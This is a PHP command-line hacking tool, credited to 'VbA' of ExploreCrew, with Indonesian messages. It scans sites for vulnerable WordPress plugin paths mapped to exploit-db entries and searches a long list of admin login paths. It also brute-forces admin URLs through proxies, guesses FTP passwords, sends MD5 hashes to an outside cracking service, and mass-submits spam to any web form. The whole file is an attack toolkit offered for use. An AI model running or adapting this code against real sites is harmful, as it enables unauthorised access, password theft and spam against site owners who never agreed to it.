<?php
if(defined('STDIN') )
{
//-------------------
// Mini Tool
// Coded by VbA 
// ExploreCrew.org | IBT RIAU 
// Thanks to : BoB (udah mau cari2 data dari exploit-db) :P 
//-------------------
error_reporting(0);
set_time_limit(0);

$vuln_wp=array(
		'wp-content/plugins/portable-phpmyadmin/wp-pma-mod'=>'http://www.exploit-db.com/exploits/23356/',
		'wp-content/themes/clockstone/theme/functions/upload.php'=>'http://www.exploit-db.com/exploits/23494/',
		'wp-content/plugins/plugin-dir/timeline/index.php'=>'http://www.exploit-db.com/exploits/22853/',
		'wp-content/plugins/all-video-gallery/config.php'=>'http://www.exploit-db.com/exploits/22427/',
		'wp-content/plugins/bbpress/forum.php'=>'http://www.exploit-db.com/exploits/22396/',
		'wp-content/plugins/foxypress/uploadify/uploadify.php'=>'http://www.exploit-db.com/exploits/22374/',
		'wp-admin/post.php?post=43&action=edit'=>'http://www.exploit-db.com/exploits/22374/',
		'wp-content/plugins/webinar_plugin/get-widget.php'=>'http://www.exploit-db.com/exploits/22300/',
		'wp-content/plugins/webinar_plugin/get-widget.php?wid=3'=>'http://www.exploit-db.com/exploits/22300/',
		'wp-content/plugins/social-discussions/social-discussions-networkpub_ajax.php'=>'http://www.exploit-db.com/exploits/22158/',
		'wp-content/plugins/fs-real-estate-plugin/xml/marker_listings.xml?id='=>'http://www.exploit-db.com/exploits/22071/',
		'wp-content/themes/archin/hades_framework/option_panel/ajax.php'=>'http://www.exploit-db.com/exploits/21646/',
		'wp-admin/admin.php?page=wp-topbar.php&action=topbartext&barid=1'=>'http://www.exploit-db.com/exploits/21393/',
		'wp-content/plugins/hd-webplayer/config.php'=>'http://www.exploit-db.com/exploits/20918/',
		'wp-content/plugins/hd-webplayer/playlist.php'=>'http://www.exploit-db.com/exploits/20918/',
		'wp-content/plugins/count-per-day/'=>'http://www.exploit-db.com/exploits/20862/',
		'wp-content/plugins/mini-mail-dashboard-widget/'=>'http://www.exploit-db.com/exploits/20358/',
		'wp-content/plugins/postie/'=>'http://www.exploit-db.com/exploits/20360/',
		'wp-content/plugins/wp-simplemail/'=>'http://www.exploit-db.com/exploits/20361/',
		'wp-content/plugins/threewp-email-reflector/'=>'http://www.exploit-db.com/exploits/20365/',
		'wp-content/themes/diary/sendmail.php'=>'http://www.exploit-db.com/exploits/19862/',
		'wp-content/plugins/resume-submissions-job-postings/includes/functions.php'=>'http://www.exploit-db.com/exploits/19791/',
		'wp-content/plugins/website-faq/website-faq-widget.php'=>'http://www.exploit-db.com/exploits/19400/',
		'wp-content/plugins/radykal-fancy-gallery/admin/image-upload.php'=>'http://www.exploit-db.com/exploits/19398/',
		'wp-content/plugins/wp-automatic/inc/csv.php'=>'http://www.exploit-db.com/exploits/19187/',
		'wp-content/plugins/wp-gpx-maps/wp-gpx-maps_admin_tracks.php'=>'http://www.exploit-db.com/exploits/19050/',
		'wp-content/plugins/user-meta/framework/helper/uploader.php'=>'http://www.exploit-db.com/exploits/19052/',
		'wp-content/plugins/topquark/lib/js/fancyupload/showcase/batch/script.php'=>'http://www.exploit-db.com/exploits/19053/',
		'wp-content/plugins/sfbrowser/connectors/php/sfbrowser.php'=>'http://www.exploit-db.com/exploits/19054/',
		'wp-content/plugins/pica-photo-gallery/picaPhotosResize.php'=>'http://www.exploit-db.com/exploits/19055/',
		'wp-content/plugins/mac-dock-gallery/upload-file.php'=>'http://www.exploit-db.com/exploits/19056/',
		'wp-content/plugins/drag-drop-file-uploader/dnd-upload.php'=>'http://www.exploit-db.com/exploits/19057/',
		'wp-content/plugins/custom-content-type-manager/upload_form.php'=>'http://www.exploit-db.com/exploits/19058/',
		'wp-content/plugin/content-flow3d'=>'http://www.exploit-db.com/exploits/19036/',
		'wp-content/plugins/front-file-manager/upload.php'=>'http://www.exploit-db.com/exploits/19012/',
		'wp-content/plugins/pica-photo-gallery/picadownload.php'=>'http://www.exploit-db.com/exploits/19016/',
		'wp-content/plugins/plugin-newsletter/preview.php'=>'http://www.exploit-db.com/exploits/19018/',
		'wp-content/plugins/rbxgallery/uploader.php'=>'http://www.exploit-db.com/exploits/19019/',
		'wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php'=>'http://www.exploit-db.com/exploits/19020/',
		'wp-content/plugins/thinkun-remind/exportData.php'=>'http://www.exploit-db.com/exploits/19021/',
		'wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php'=>'http://www.exploit-db.com/exploits/19022/',
		'wp-content/plugins/wpstorecart/php/upload.php'=>'http://www.exploit-db.com/exploits/19023/',
		'wp-content/plugins/omni-secure-files/plupload/examples/upload.php'=>'www.exploit-db.com/exploits/19009/',
		'wp-content/plugins/front-end-upload/upload.php'=>'http://www.exploit-db.com/exploits/19008/',
		'wp-content/plugins/gallery-plugin/upload/php.php'=>'http://www.exploit-db.com/exploits/18998/',
		'wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php'=>'http://www.exploit-db.com/exploits/18997/',
		'wp-content/plugins/font-uploader/font-upload.php'=>'http://www.exploit-db.com/exploits/18994/',
		'wp-content/plugins/mm-forms-community/includes/doajaxfileupload.php'=>'http://www.exploit-db.com/exploits/18997/',
		'wp-content/plugins/gallery-plugin/upload/php.php'=>'http://www.exploit-db.com/exploits/18998/',
		'wp-content/plugins/asset-manager/upload.php'=>'http://www.exploit-db.com/exploits/18993/',
		'wp-content/plugins/font-uploader/font-upload.php'=>'http://www.exploit-db.com/exploits/18994/',
		'wp-content/plugins/foxypress/uploadify/uploadify.php'=>'http://www.exploit-db.com/exploits/18991/',
		'wp-content/plugins/html5avmanager/lib/uploadify/custom.php'=>'http://www.exploit-db.com/exploits/18990/',
		'wp-content/plugins/store-locator-le/core/load_wp_config.php'=>'http://www.exploit-db.com/exploits/18989/',
		'wp-content/plugins/wpmarketplace/uploadify/uploadify.php'=>'http://www.exploit-db.com/exploits/18988/',
		'wp-content/plugins/wp-property/third-party/uploadify/uploadify.php'=>'http://www.exploit-db.com/exploits/18987/',
		'wp-content/plugins/kish-guest-posting/uploadify/scripts/uploadify.php'=>'http://www.exploit-db.com/exploits/18412/',
		'wp-content/plugins/ucan-post/'=>'http://www.exploit-db.com/exploits/18390/',
		'wp-content/plugins/count-per-day/download.php?n='=>'http://www.exploit-db.com/exploits/18355/',
		'wp-content/plugins/wp-autoyoutube/modules/index.php'=>'http://www.exploit-db.com/exploits/18353/',
		'wp-content/plugins/age-verification/age-verification.php?redirect_to='=>'http://www.exploit-db.com/exploits/18350/',
		'wp-content/plugins/pay-with-tweet.php/pay.php'=>'http://www.exploit-db.com/exploits/18330/',
		'wp-content/plugins/mailz/lists/dl.php?'=>'http://www.exploit-db.com/exploits/18276/',
		'wp-admin/admin-ajax.php?'=>'http://www.exploit-db.com/exploits/18231/',
		'wp-content/plugins/jetpack/modules/sharedaddy.php'=>'http://www.exploit-db.com/exploits/18126/',
		'wp-content/plugins/adrotate/adrotate-out.php?track='=>'http://www.exploit-db.com/exploits/18114/'
);

$admin_page=array('admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php');

 if(!function_exists('curl_init')) {
	die ("Paket Curl Belum di install - sudo apt-get install curl");
 }
 
 function get($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, TRUE);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0"); 
	curl_setopt($ch,CURLOPT_NOBODY,false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$output=array();
	$output[]=curl_exec($ch);
	$output[]= curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	return $output;
}
 function getx($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, TRUE);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0"); 
	curl_setopt($ch,CURLOPT_NOBODY,false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$output=array();
	$output[]=curl_exec($ch);
	$output[]= curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	return $output;
}
 function getproxy($url,$proxy,$tipe){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);		
	curl_setopt($ch, CURLOPT_HEADER, TRUE);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0"); 
	curl_setopt($ch, CURLOPT_PROXYTYPE, trim($tipe));
	curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
	curl_setopt($ch, CURLOPT_REFERER,"http://google.com");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);	
	curl_setopt($ch, CURLOPT_TIMEOUT, 5);	
	$output=array();
	session_write_close();
	$output[]=curl_exec($ch);
	$output[]= curl_getinfo($ch, CURLINFO_HTTP_CODE);
	echo curl_error($ch);
	curl_close($ch);
	return $output;
}
function sendpost($url,$data){
	$ch =curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:17.0) Gecko/20100101 Firefox/17.0"); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
	curl_setopt($ch, CURLOPT_VERBOSE, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $respond = curl_exec($ch);
    $output= curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $output;
}
function fixurl($url)
{
				if(substr($url,-1)!='/')
				{
					$url=$url."/";
				}
				return $url;
}
function domain($url){
	preg_match("/^(http:\/\/)?([^\/]+)/i",$url, $matches);
	$www = $matches[2];
	preg_match("/[^\.\/]+\.[^\.\/]+$/", $www, $matches);
	return $matches[0];
}	
 if(isset($argv[1])){
switch($argv[1])
{
		case 'wp-scan':
		$url=fixurl($argv[2]);
			echo "Loading WP-SCAN....\n";
				function versiwp($wpsite){
					$readmepage=get($wpsite."readme.html");
					$installpage=get($wpsite."wp-admin/install.php");
					if(strstr($readmepage[0],"Version")){
						$versi= explode("Version",$readmepage[0]);
						$versi=explode("</h1>",$versi[1]);
						$versi=$versi[0];
						return $versi;
					}else{
						if(strstr($wpsite,'<meta name="generator"')){
							$versi=explode('<meta name="generator" content="',$wpsite);
							$versi=explode('"',$versi[1]);
							$versi=$versi[0];
							return $versi;
						}else{
							if(strstr($installpage[0],"<link rel='stylesheet' id='install-css'  href=")){
								$versi= explode("<link rel='stylesheet' id='install-css'  href='",$installpage[0]);
								$versi=explode("'",$versi[1]);
								$versi=explode("ver=",$versi[0]);
								return $versi[1];
							}else{
								return "Belum Terdeteksi";
							}
						}
					}
				}
			if($url!=null)
			{
			$bukalog=fopen('wordpress logs.txt','a+');
				$datawp="";
				$wp_versi= "-------------------------------------------------------------------------------------- \r\n\r\n --------------------------------------------------\n\n URL : $url \n Wordpress Version ".trim(versiwp($url))."\n --------------------------------------------------\n\n ";	
				echo $wp_versi;
				foreach(array_keys($vuln_wp) as $vulner)
				{				
				$vulner=trim($vulner);
				$cek=getx($url.$vulner);
					if($cek[1]=="200")
					{
						$datawp.="\r\n Found => $url$vulner \r\n Exploit => ".$vuln_wp[$vulner]." \r\n \r\n \r\n";						
						echo "\033[01;31m \n Found => $url$vulner \n  Exploit => ".$vuln_wp[$vulner]." \n \n
							   \n \033[0m";
						echo "\n";
					}else{
						echo "$vulner => Not Vuln \n";
					}
				}
				$datawp.="-------------------------------------------------------------------------------------- \r\n\r\n";
					fwrite($bukalog,$wp_versi.$datawp);
					echo "\033[01;33m cek file  'wordpress logs.txt' untuk lihat hasilnya ! \n\n \033[0m";
				fclose($bukalog);
			}
			break;
			
		case 'admin-finder':
		echo $argv[2]."\n";
		$url=fixurl($argv[2]);
			echo "Loading Admin Finder...\n";
			echo " ---------------------------------------\n Target : $url \n ---------------------------------------\n\n";
			foreach($admin_page as $page)
			{
				$cek=get($url.$page);
					if($cek[1]=="200")
					{
						$buka=fopen('log admin finder.txt','a+');
						$data="------------------------------------\r\n
							   Found => $url$page \r\n\r\n";						
						fwrite($buka,$data);
						fclose($buka);
						echo "\033[01;31m $url$page => Found \033[0m";
						echo "\n";
					}else{
						echo "$url$page => Not Found \n";
					}			
			}
			break;		
			
		case 'af-brute':
		$url=fixurl($argv[2]);
			echo " ---------------------------------------\n Target : $url \n ---------------------------------------\n\n";
		if(isset($argv[3]))
		{
			if(strstr($argv[3],'-'))
			{
		$huruf_awal="";
		$huruf_akhir="";
		$huruf=explode("-",$argv[3]);
		for($o=1;$o<=$huruf[0];$o++)
		{
			$huruf_awal.="a";
		}		
		for($o=1;$o<=$huruf[1];$o++)
		{
			$huruf_akhir.="z";
		}
		if(isset($argv[4]))
		{
			
			function cek_page2($web,$proxy,$type)
			{					
				$cek=getproxy($web,$proxy,$type);
				$hasil_page=array();
					if($cek[1]=="200")
					{
						$buka=fopen('log admin brute.txt','a+');
						$data="------------------------------------\r\n
							   Found => $web \r\n\r\n";						
						fwrite($buka,$data);
						fclose($buka);
						echo "\033[01;31m $web => Found \033[0m";
						echo "\n";
						$hasil_page[]="0";
					}else{
						echo "$web => Not Found \n";
						$hasil_page[]="1";
					}				
			}
			if(strstr($argv[4],","))
			{
				$data_proxy=explode(",",$argv[4]);
				$jumlah_proxy=count($data_proxy);
				$list_proxy=array();
				$proxy_tipe=array();
				foreach($data_proxy as $proxy)
				{
					$use_proxy = explode(':',$proxy);
					$list_proxy[]=$use_proxy[0].":".$use_proxy[1];
					$proxy_tipe[]=$use_proxy[2];	
				}
			}else{
					$use_proxy = explode(':',$argv[4]);
					$list_proxy=$use_proxy[0].":".$use_proxy[1];
					$proxy_tipe=$use_proxy[2];				
			}
			if(count($list_proxy)>1)
			{
			
				for($d=0;$d<=count($list_proxy);$d++)
				{
	
				$cekpr=getproxy("http://google.com",$list_proxy[$d],$proxy_tipe[$d]);
				$test = stripos($cekpr[0],'<form');
				if($test<=0){echo "\033[01;32m Proxy ini mati om !! \033[0m \n";
				if(count($list_proxy)>1)
				{
				$d=$d+1;
					$cekpr=getproxy("http://google.com",$list_proxy[$d],$proxy_tipe[$d]);
					$test = stripos($cekpr[0],'<form');		
					if($test<=0){echo "\033[01;32m Proxy ini mati om !! \033[0m \n";exit;}
				}
				else{exit;} }				
				echo "Menggunakan Proxy !  ".$list_proxy[$d]." \n";
					$lokasi=getproxy("http://api.hostip.info/?ip=",$list_proxy[$d],$proxy_tipe[$d]);
					$plokasi=explode("<Hostip>",$lokasi[0]);
					$plokasi=explode("</countryAbbrev>",$plokasi[1]);
					$plokasi=str_replace("<ip>","IP=",$plokasi[0]);
					$plokasi=str_replace(array("</ip>","<gml:name>","</gml:name>","<countryName>","</countryName>","<countryAbbrev>")," ",$plokasi);
					echo $plokasi."\n\n";				
					for($i= $huruf_awal; $i < $huruf_akhir; $i++) cek_page2($url.$i,$list_proxy[$d],$proxy_tipe[$d]);
				if(count($hasil_page)>150)
						{$d=$d+1;$hasil_page="";}
						else
						{$d=$d-1;}					
					
				}
			}else{
			echo "Menggunakan Proxy !  ".$list_proxy." \n";
			
				$cekpr=getproxy("http://google.com",$list_proxy,$proxy_tipe);
				$test = stripos($cekpr[0],'<form');
				if($test<=0){echo "\033[01;32m Proxy ini mati om !! \033[0m \n"; exit; }					
					$lokasi= getproxy("http://api.hostip.info/?ip=",$list_proxy,$proxy_tipe);
					$plokasi=explode("<Hostip>",$lokasi[0]);
					$plokasi=explode("</countryAbbrev>",$plokasi[1]);
					$plokasi=str_replace("<ip>","IP=",$plokasi[0]);
					$plokasi=str_replace(array("</ip>","<gml:name>","</gml:name>","<countryName>","</countryName>","<countryAbbrev>")," ",$plokasi);
					echo $plokasi."\n\n";					
				for($i= $huruf_awal; $i < $huruf_akhir; $i++) cek_page2($url.$i,$list_proxy,$proxy_tipe);			
			}
		}else{
			function cek_page($web)
			{			
				$cek=get($web);
					if($cek[1]=="200")
					{
						$buka=fopen('log admin brute.txt','a+');
						$data="------------------------------------\r\n
							   Found => $web \r\n\r\n";						
						fwrite($buka,$data);
						fclose($buka);
						echo "\033[01;31m $web => Found \033[0m";
						echo "\n";
					}else{
						echo "$web => Not Found \n";
					}				
			}
				for($i= $huruf_awal; $i < $huruf_akhir; $i++) cek_page($url.$i);	
		}
			}else{
				echo "\nMasukkan Min dan Max huruf, ex : 1-3\n";			
			}
		}else{
			echo "\nMasukan max limit huruf brute ! \n";			
		}
			break;
		case 'ftp-brute':
			if(strstr($argv[4],'-') && isset($argv[3]) && isset($argv[4]))
			{
		$huruf_awal="";
		$huruf_akhir="";
		$huruf=explode("-",$argv[4]);
		for($o=1;$o<=$huruf[0];$o++)
		{
			$huruf_awal.="a";
		}		
		for($o=1;$o<=$huruf[1];$o++)
		{
			$huruf_akhir.="z";
		}
		echo "Domain | Username | Password  | Status \n --------------------------------------------- \n"; 
			  function login($domain,$user,$key){
				if(@ftp_connect($domain)){
						if(@ftp_login(@ftp_connect($domain),$user,$key)){
						echo " \033[01;31m Found -> Password ".$key." \033[0m /n";
						$buka=fopen('ftp brute.txt','a+');
						$data="------------------------------------\r\n
							   URL:$domain\n user:$user\n passwd:$key \r\n\r\n";						
						fwrite($buka,$data);
						fclose($buka);						
						}else{
							echo "$domain | $user | $key  => Not valid \n";
						}
					}else{
						echo "$domain => Not SUpport FTP !!! \n";
					}
				}
			$domen=str_replace(array("http://","http://www",":","/"),"",$argv[2]);
			for($i= $huruf_awal; $i < $huruf_akhir; $i++)login($domen,$argv[3],$i);
			}else{
				echo "\nMasukkan Min dan Max huruf, ex : 1-3 \n";	
				echo "\n ftp-brute [domain] [user] \n Example : ftp-brute explorecrew.org iamvba 1-5 \n\n";				
			}
			break;
		case 'crackmd5':
			$crack=get('http://explorecrew.org/tools/md5.php?hash='.$argv[2]);
			$result=explode('<pre>',$crack[0]);
			$result=explode('</pre>',$result[1]);
				echo " \033[01;31m  ".$result[0]." \033[0m ";
			break;
		case 'formspammer':
		if(isset($argv[2])){
			if(isset($argv[3]))
			{
			if(!is_numeric($argv[3])){echo "Anda Memasukkan JUmlah yang salah untuk SPAM!";exit; }
				for($i=1;$i<=$argv[3];$i++)
				{
						$url=$argv[2];
						$openweb=file_get_contents($url);
						$form=explode("<fo",$openweb);
						$hasil="";
						$data=explode('</form',$form[1]);
						$data=$data[0];
							$match = array();
							preg_match("/rm action=\"(.*?)\" /", $data, $match);
							if(trim($match[1])!=""){$hasilform=trim($match[1]);};
							$cekinput=explode("<in",$data);
							foreach($cekinput as $input)
							{
								$matchs = array();
								preg_match("/put type=\"(\\w+?)\" name=\"(\\w+?)\" /" , $input, $matchs);
								if(trim($matchs[2])!=""){$hasil.=trim($matchs[2])."=VbA@ExploreCrew.org&";};
							}	
							$cektextbox=explode("<tex",$data);
							foreach($cektextbox as $textbox)
							{
								$matchs = array();
								preg_match("/tarea name=\"(\\w+?)\"/" , $textbox, $matchs);
								if(trim($matchs[1])!=""){$hasil.=trim($matchs[1])."=Mini Tool Auto Spammer Coded by VbA&";};
							}
							$cekselect=explode("<sel",$data);
							foreach($cekselect as $select)
							{
								$matchs = array();
								preg_match("/ect name=\"(\\w+?)\"/" , $select, $matchs);
								if(trim($matchs[1])!=""){$hasil.=trim($matchs[1]."=Coded by VbA&");};
							}	
							if($hasilform=="")
							{
								$target=$url;
							}else{ 
								if(substr($hasilform,0,1)!="/")
								{
									$hasilform="/".$hasilform;
								}
								$target="http://".domain($url).$hasilform;
							}
							$spam=sendpost($target,$hasil);
								if($spam=="200")
								{
									echo "\033[01;31m $i $target =>  Berhasil di SPAM \033[0m";
									echo "\n";
								}else{
									echo "$i $target => Gagal di spam \n";
								}
				}
			}else{
				echo "Masukkan Jumlah SPAM \n";
			}	
		}else{
			echo "Masukkan Halaman Form Target !! \n";
		}	
			break;
		case 'help':
				echo "
	  U   N   D   E   R   G   R   O   U   N   D       C   O   D   E   R       T   E   A   M
	  ___________              .__                         _________                        
	  \_   _____/__  _________ |  |   ___________   ____   \_   ___ \_______   ______  _  __
	   |    __)_\  \/  /\____ \|  |  /  _ \_  __ \_/ __ \  /    \  \/\_  __ \_/ __ \ \/ \/ /
	   |        \>    < |  |_> >  |_(  <_> )  | \/\  ___/  \     \____|  | \/\  ___/\     / 
	  /_______  /__/\_ \|   __/|____/\____/|__|    \_____>  \______  /|__|    \___  >\/\_/  
	          \/      \/|__|    -==[ w3 4r3 th3 4nk3r t34m ]==-    \/             \/    
				   \033[01;32m Mini  Tool - Full Coded by VbA  \n
				   Special Thanks to : ExploreCrew.org | IBT Riau | Bob Halliwel(Thx buat listing exploit-idnya) | AVP \n 
				   \033[0m  \n\n";
								 
							echo "\033[01;33m ";
								echo "Avaiable Command  : \n";
								echo "	\033[01;34m wp-scan [url] \033[0m\n\033[01;33m	ex: wp-scan ExploreCrew.org\n		Scanning Vuln Worpdress, Tambah Vuln wp di script untuk lebih relevant\n\033[0m";
								echo "	\033[01;34m admin-finder [url] \033[0m\n\033[01;33m	ex: admin-finder ExploreCrew.org\n		Pencari Halaman login website dengan direktori list admin page di script\n\033[0m";
								echo "	\033[01;34m af-brute [url] [min-max character] \033[0m\n\033[01;33m	ex: af-brute ExploreCrew.org 1-6\n		Brute Force Halaman Login Admin dimulai dari a-z dengan minimum-maximum huruf \n	ex w/ proxy: af-brute ExploreCrew.org 1-6 ip:port:tipe,ip:port:tipe,210.22.135.125:3128:https\n		Brute Force halaman login admin dimulai dari a-z dengan min-max huruf ditambah PROXY\n\033[0m";
								echo "	\033[01;34m ftp-brute [domain] [user] \033[0m\n	\033[01;33mex: ftp-brute explorecrew.org iamvba\n		Brute Fore FTP dimulai dari a-z dengan min-max huruf\n\033[0m";
								echo "	\033[01;34m crackmd5  [md5] \033[0m\n\033[01;33m	ex: crackmd5 0e47aed10bb21162cc9df9ec78a4f7d1\n		crack hash md5 jadi karakter semula\n\033[0m";										
								echo "	\033[01;34m formspammer  [url target] [jumlah spam] \033[0m\n\033[01;33m	ex: formspammer http://ExploreCrew.org/Contact\n		Form Spammer untuk nyepam sebuah form target, cukup masukkan URL dimana form itu berada maka otomatis di detect untuk spam\n\033[0m";										
								echo  "	\033[01;34m help => return this :P \033[0m\n";
							echo "\033[0m";
			break;		
}
}else{
echo "
	  U   N   D   E   R   G   R   O   U   N   D       C   O   D   E   R       T   E   A   M
	  ___________              .__                         _________                        
	  \_   _____/__  _________ |  |   ___________   ____   \_   ___ \_______   ______  _  __
	   |    __)_\  \/  /\____ \|  |  /  _ \_  __ \_/ __ \  /    \  \/\_  __ \_/ __ \ \/ \/ /
	   |        \>    < |  |_> >  |_(  <_> )  | \/\  ___/  \     \____|  | \/\  ___/\     / 
	  /_______  /__/\_ \|   __/|____/\____/|__|    \_____>  \______  /|__|    \___  >\/\_/  
	          \/      \/|__|    -==[ w3 4r3 th3 4nk3r t34m ]==-    \/             \/    				   
   \033[01;32m Mini  Tool - Full Coded by VbA  \n
   Special Thanks to : ExploreCrew.org | IBT Riau | Bob Halliwel(Thx buat listing exploit-idnya) | AVP \n 
   \033[0m  \n\n";
				 
					echo "\033[01;33m ";
						echo "Avaiable Command  : \n";
						echo "	\033[01;34m wp-scan [url] \033[0m\n\033[01;33m	ex: wp-scan ExploreCrew.org\n		Scanning Vuln Worpdress, Tambah Vuln wp di script untuk lebih relevant\n\033[0m";
						echo "	\033[01;34m admin-finder [url] \033[0m\n\033[01;33m	ex: admin-finder ExploreCrew.org\n		Pencari Halaman login website dengan direktori list admin page di script\n\033[0m";
						echo "	\033[01;34m af-brute [url] [min-max character] \033[0m\n\033[01;33m	ex: af-brute ExploreCrew.org 1-6\n		Brute Force Halaman Login Admin dimulai dari a-z dengan minimum-maximum huruf \n	ex w/ proxy: af-brute ExploreCrew.org 1-6 ip:port:tipe,ip:port:tipe,210.22.135.125:3128:https\n		Brute Force halaman login admin dimulai dari a-z dengan min-max huruf ditambah PROXY\n\033[0m";
						echo "	\033[01;34m ftp-brute [domain] [user] \033[0m\n	\033[01;33mex: ftp-brute explorecrew.org iamvba\n		Brute Fore FTP dimulai dari a-z dengan min-max huruf\n\033[0m";
						echo "	\033[01;34m crackmd5  [md5] \033[0m\n\033[01;33m	ex: crackmd5 0e47aed10bb21162cc9df9ec78a4f7d1\n		crack hash md5 jadi karakter semula\n\033[0m";										
						echo "	\033[01;34m formspammer  [url target] [jumlah spam] \033[0m\n\033[01;33m	ex: formspammer http://ExploreCrew.org/Contact\n		Form Spammer untuk nyepam sebuah form target, cukup masukkan URL dimana form itu berada maka otomatis di detect untuk spam\n\033[0m";										
						echo  "	\033[01;34m help => return this :P \033[0m\n";
					echo "\033[0m";
}

}else{
  echo("Hanya PHP CLI boss !!!");
}
?>

